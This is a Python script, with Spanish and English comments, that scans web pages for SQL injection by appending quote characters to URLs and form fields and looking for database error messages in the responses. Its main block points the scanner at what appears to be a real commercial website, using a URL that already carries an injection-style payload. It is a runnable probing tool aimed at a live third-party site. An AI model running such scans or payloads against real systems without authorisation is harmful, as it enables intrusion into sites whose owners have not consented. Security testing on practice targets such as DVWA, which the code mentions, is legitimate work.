import requests
# import re # uncomment this for DVWA
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

def get_all_forms(url):
    """Dado una URL o direccioón de pagina, decuelve todos los formularios del contenido HTML"""
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    Esta función extrae la información util del formulario obtenidos
    """
    details = {}
    # obtener la acción del formulario (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    # obtener metodo del formulario (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # obtener detalles de entrada como tipos y nombre
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # colocar todo en el diccionario resultante
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    """A simple boolean function that determines whether a page 
    is SQL Injection vulnerable from its `response`"""
    errors = {
        # +++ MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # +++   Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        # iSi encuentra error devuelve True
        if error in response.content.decode().lower():
            return True
    # no error detected
    return False


def scan_sql_injection(url):
    # Verifica on URL
    for c in "\"'":
        # Adiciona quote/double quote character to the URL
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)
        # Hacer el requerimiento HTTP 
        res = s.get(new_url)
        if is_vulnerable(res):
            # SQL Injection detected on the URL itself, 
            # no need to preceed for extracting forms and submitting them
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return
    # Probar en formularios HTML
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["value"] or input_tag["type"] == "hidden":
                    # any input form that has some value or hidden,
                    # just use it in the form body
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # all others except submit, use some junk data with special character
                    data[input_tag["name"]] = f"test{c}"
            # join the url with the action (form request URL)
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["method"] == "get":
                res = s.get(url, params=data)
            # test whether the resulting page is vulnerable
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                pprint(form_details)
                break   

if __name__ == "__main__":
    url = "http://www.rjalubeequipmentsales.com/prod.php?id=Tank’ and [t] and ‘1’=’1"
    scan_sql_injection(url)